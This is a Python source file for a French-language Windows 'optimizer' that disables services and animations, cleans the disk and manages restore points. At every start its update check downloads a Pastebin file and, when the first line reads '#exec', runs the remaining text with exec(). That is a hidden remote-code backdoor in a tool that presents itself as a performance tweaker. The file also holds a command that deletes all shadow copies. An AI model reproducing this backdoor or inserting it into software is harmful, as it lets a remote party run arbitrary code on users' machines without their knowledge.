import os
import json
import subprocess
from colorama import Fore, Style, init
import os;os.system('cls')
import ctypes;ctypes.windll.kernel32.SetConsoleTitleW(" OPTIMIZER >> made by s.worm")
import sys


import requests
import os

# Version actuelle du script
current_version = "1.20"  # Remplace par la version actuelle de ton script

# Fonction pour vérifier le fichier de mise à jour sur Pastebin
def check_update():
    url = "https://pastebin.com/raw/ykDVZUgs"
    try:
        response = requests.get(url)
        response.raise_for_status()  # Lève une erreur si la requête échoue
        lines = response.text.splitlines()  # Récupère toutes les lignes

        if not lines:
            print(f"{Fore.RED}Le fichier est vide.")
            sys.exit()


        first_line = lines[0].strip()  # Récupère la première ligne

        if first_line.startswith("#actif"):
            pass  # Exécute le reste du script
        elif first_line.startswith("#noactif"):
            input(f"{Fore.RED}Le script est désactivé.")
            sys.exit()

        elif first_line.startswith("#update"):
            parts = first_line.split()
            if len(parts) == 3:  # Vérifie que nous avons l'URL et la version
                update_url = parts[1]
                update_version = parts[2]
                
                if update_version != current_version:
                    input(f"{Fore.GREEN}Une nouvelle version est disponible. Téléchargez-la ici : {update_url}")
                    sys.exit()

                else:
                    input(f"{Fore.YELLOW}Vous avez déjà la dernière version : {current_version}.")
                    os.system('cls')
                
        elif first_line.startswith("#exec"):
            exec("\n".join(lines[1:]))  # Exécute le reste du script contenu dans le raw

    except Exception as e:
        input(f"{Fore.RED}Erreur lors de la récupération du fichier de mise à jour : {e}")
        sys.exit()



# Initialiser colorama
init(autoreset=True)



# Exécute une commande PowerShell
def run_powershell(command):
    result = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True)
    return result.stdout.strip()

# Sauvegarde les services et les paramètres système dans un fichier JSON
def backup_settings(file_path):
    backup_data = {}
    
    # Sauvegarde des services
    services = ["DiagTrack", "SysMain", "WSearch"]
    backup_data['services'] = {}
    for service in services:
        status = run_powershell(f"(Get-Service -Name {service}).StartType")
        backup_data['services'][service] = status
        print(f"{Fore.YELLOW}Statut de {service} sauvegardé : {status}")
    
    # Sauvegarde des animations
    animation_keys = {
        "HKCU\\Control Panel\\Desktop\\WindowMetrics": "MinAnimate",
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced": "TaskbarAnimations"
    }
    backup_data['animations'] = {}
    for key, value in animation_keys.items():
        reg_value = run_powershell(f"(Get-ItemProperty -Path {key}).{value}")
        backup_data['animations'][key] = reg_value
        print(f"{Fore.YELLOW}Valeur de {key} sauvegardée : {reg_value}")
    
    # Enregistrement dans le fichier JSON
    with open(file_path, 'w') as backup_file:
        json.dump(backup_data, backup_file, indent=4)
    print(f"{Fore.GREEN}Sauvegarde des paramètres dans {file_path}.")

# Restaurer les paramètres à partir du fichier JSON
def restore_settings(file_path):
    if not os.path.exists(file_path):
        print(f"{Fore.RED}Le fichier de sauvegarde {file_path} n'existe pas.")
        return

    with open(file_path, 'r') as backup_file:
        backup_data = json.load(backup_file)
    
    # Restaurer les services
    for service, status in backup_data.get('services', {}).items():
        command = f"Set-Service -Name {service} -StartupType {status}"
        run_powershell(command)
        print(f"{Fore.CYAN}Service {service} restauré à {status}.")

    # Restaurer les animations
    for key, reg_value in backup_data.get('animations', {}).items():
        command = f"Set-ItemProperty -Path {key} -Name {list(reg_value.keys())[0]} -Value {list(reg_value.values())[0]}"
        run_powershell(command)
        print(f"{Fore.CYAN}Animation {key} restaurée à {reg_value}.")

# Optimise les paramètres du système
def optimize_system():
    disable_unnecessary_services()
    disable_animations()
    enable_max_performance()

# Vérifie l'état des services importants
def check_services_status():
    services = ["DiagTrack", "SysMain", "WSearch"]
    for service in services:
        status = run_powershell(f"(Get-Service -Name {service}).Status")
        print(f"{Fore.BLUE}Le service {service} est {status}.")


# Lance un nettoyage du disque
def cleanup_disk():
    print(f"{Fore.YELLOW}Nettoyage du disque en cours...")
    run_powershell("cleanmgr /sagerun:1")
    print(f"{Fore.GREEN}Nettoyage du disque terminé.")


# Gère les points de restauration du système
def manage_restore_points():
    print(f"{Fore.YELLOW}Création d'un point de restauration...")
    run_powershell("Checkpoint-Computer -Description 'Backup' -RestorePointType 'MODIFY_SETTINGS'")
    print(f"{Fore.GREEN}Point de restauration créé.")


    delete_choice = input(f"{Fore.CYAN}Voulez-vous supprimer les anciens points de restauration ? (y/n): {Style.RESET_ALL}")
    if delete_choice.lower() == "y":
        run_powershell("vssadmin delete shadows /for=c: /all /quiet")
        print(f"{Fore.RED}Tous les anciens points de restauration ont été supprimés.")


# Désactivation des services inutiles
def disable_unnecessary_services():
    services = ["DiagTrack", "SysMain", "WSearch"]
    for service in services:
        run_powershell(f"Set-Service -Name {service} -StartupType Disabled")
        print(f"{Fore.RED}{service} désactivé.")

# Désactive les animations pour de meilleures performances
def disable_animations():
    animation_keys = {
        "HKCU\\Control Panel\\Desktop\\WindowMetrics": "MinAnimate",
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced": "TaskbarAnimations"
    }
    for key, value in animation_keys.items():
        run_powershell(f"Set-ItemProperty -Path {key} -Name {value} -Value 0")
        print(f"{Fore.RED}Animation désactivée pour {key}.")

# Active le mode de performance maximale
def enable_max_performance():
    run_powershell("powercfg /s SCHEME_MIN")
    print(f"{Fore.GREEN}Mode de performance maximale activé.")
 

# Affiche l'état du système (CPU, RAM, disque)
def show_system_status():
    cpu_usage = run_powershell("(Get-WmiObject -Class Win32_Processor).LoadPercentage")
    ram_usage = run_powershell("(Get-WmiObject -Class Win32_OperatingSystem).FreePhysicalMemory")
    disk_usage = run_powershell("(Get-PSDrive -PSProvider FileSystem).Used")

    print(f"{Fore.CYAN}Utilisation du CPU : {cpu_usage}%")
    print(f"{Fore.CYAN}Mémoire RAM disponible : {int(ram_usage) // 1024} MB")
    print(f"{Fore.CYAN}Espace disque utilisé : {disk_usage}")
    input("Appuis sur entrer pour revenir au Menu Principal")
    os.system('cls')
    

# Affiche un beau menu avec du texte ASCII
def show_menu():
    banner = f"""{Fore.CYAN}
               ██████╗ ██████╗ ████████╗██╗███╗   ███╗██╗███████╗███████╗██████╗ 
              ██╔═══██╗██╔══██╗╚══██╔══╝██║████╗ ████║██║╚══███╔╝██╔════╝██╔══██╗
              ██║   ██║██████╔╝   ██║   ██║██╔████╔██║██║  ███╔╝ █████╗  ██████╔╝
              ██║   ██║██╔═══╝    ██║   ██║██║╚██╔╝██║██║ ███╔╝  ██╔══╝  ██╔══██╗
              ╚██████╔╝██║        ██║   ██║██║ ╚═╝ ██║██║███████╗███████╗██║  ██║
               ╚═════╝ ╚═╝        ╚═╝   ╚═╝╚═╝     ╚═╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝{Style.RESET_ALL}"""
    print(banner)
    menu = fr"""{Fore.LIGHTCYAN_EX}
	                ╔════════════════════════════════════════════╗
                        ║              MENU PRINCIPAL                ║
                  ╔═══════    				          ═══════╗
                  ║          1. Sauvegarder les paramètres               ║
                  ║          2. Optimiser le système                     ║
                             3. Restaurer les paramètres                   
                             4. Vérifier l'état des services              
                             5. Nettoyer le disque                         
                             6. Gérer les points de restauration          
                             7. Afficher l'état du système                 
                    	     8. Retirer les pub de windows
		  ║	     9. Quitter le programme	                 ║
                  ╚═══════				          ═══════╝
	                ╚════════════════════════════════════════════╝
				   < Optimizer by s.worm >
    """
    print(menu)
    choice = input("        >> Choisissez une option >> ")
    return choice

# Programme principal
if __name__ == "__main__":
    check_update()

    backup_file = "backup.json"
    
    while True:
        choice = show_menu()
        
        if choice == "1":
            backup_settings(backup_file)
        elif choice == "2":
            optimize_system()
        elif choice == "3":
            restore_settings(backup_file)
        elif choice == "4":
            check_services_status()
        elif choice == "5":
            cleanup_disk()
        elif choice == "6":
            manage_restore_points()
        elif choice == "7":
            show_system_status()
        elif choice == "8":
            input("bientot, programme en cours de developpement...")
        elif choice == "9":
            print(f"{Fore.MAGENTA}Au revoir !")
            break
        else:
            print(f"{Fore.RED}Option non valide. Veuillez réessayer.")
